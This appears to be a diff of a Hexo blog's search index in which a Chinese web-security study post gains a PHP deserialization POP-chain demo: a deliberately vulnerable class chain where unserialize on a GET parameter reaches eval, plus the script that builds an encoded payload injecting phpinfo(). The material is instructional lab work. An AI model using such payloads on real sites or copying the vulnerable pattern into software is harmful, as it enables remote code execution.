@@ -1,6 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hello World</title>
+    <url>/blog/2026/05/14/hello-world/</url>
+    <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick StartCreate a new post$ hexo new &quot;My New Post&quot;
+
+More info: Writing
+Run server$ hexo server
+
+More info: Server
+Generate static files$ hexo generate
+
+More info: Generating
+Deploy to remote sites$ hexo deploy
+
+More info: Deployment
+]]></content>
+  </entry>
+  <entry>
     <title>网安学习</title>
     <url>/blog/2026/05/14/new/</url>
     <content><![CDATA[前提学习docker相关知识点容器与镜像的差别：
@@ -176,6 +194,13 @@ __invoke()
 #flag.txtFlag&#123;165151daw1d51ad951&#125;
 
 
+POP链demo2.php&lt;?phpclass main &#123;    protected $ClassObj;    function __construct() &#123;        $this-&gt;ClassObj = new normal();    &#125;    function __destruct() &#123;        $this-&gt;ClassObj-&gt;action();    &#125;&#125;class normal &#123;    function action() &#123;        echo &quot;hello bmjoker&quot;;    &#125;&#125;class evil &#123;    private $data;    function action() &#123;        eval($this-&gt;data);    &#125;&#125;//$a = new main();unserialize($_GET[&#x27;a&#x27;]);?&gt;
+
+
+
+#构造payload&lt;?phpclass main&#123;    protected $ClassObj;    function __construct()&#123;        $this-&gt;ClassObj = new evil();    &#125;&#125;class evil&#123;    private $data;    function __construct()&#123;        $this-&gt;data = &#x27;phpinfo();&#x27;;    &#125;&#125;$a = new main();echo urlencode(serialize($a));		#由于私有变量和保护变量会给加/00，因此需要更改成urlencode编码?&gt;O%3A4%3A%22main%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
+
+
 ]]></content>
       <categories>
         <category>操作</category>
@@ -183,23 +208,5 @@ __invoke()
       <tags>
         <tag>Web安全</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/blog/2026/05/14/hello-world/</url>
-    <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick StartCreate a new post$ hexo new &quot;My New Post&quot;
-
-More info: Writing
-Run server$ hexo server
-
-More info: Server
-Generate static files$ hexo generate
-
-More info: Generating
-Deploy to remote sites$ hexo deploy
-
-More info: Deployment
-]]></content>
   </entry>
 </search>
